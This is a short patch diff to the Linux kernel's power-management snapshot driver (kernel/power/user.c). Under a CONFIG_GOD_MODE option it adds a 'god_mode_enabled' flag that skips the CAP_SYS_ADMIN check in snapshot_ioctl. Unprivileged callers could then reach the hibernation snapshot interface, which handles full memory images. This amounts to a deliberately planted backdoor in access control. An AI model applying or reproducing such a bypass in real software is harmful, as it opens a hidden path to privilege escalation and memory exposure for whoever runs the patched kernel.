@@ -1,3 +1,6 @@
+#ifdef CONFIG_GOD_MODE
+#include <linux/god_mode.h>
+#endif
 /*
  * linux/kernel/power/user.c
  *
@@ -237,7 +240,15 @@ static long snapshot_ioctl(struct file *filp, unsigned int cmd,
 	if (_IOC_NR(cmd) > SNAPSHOT_IOC_MAXNR)
 		return -ENOTTY;
 	if (!capable(CAP_SYS_ADMIN))
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 	if (!mutex_trylock(&pm_mutex))
 		return -EBUSY;
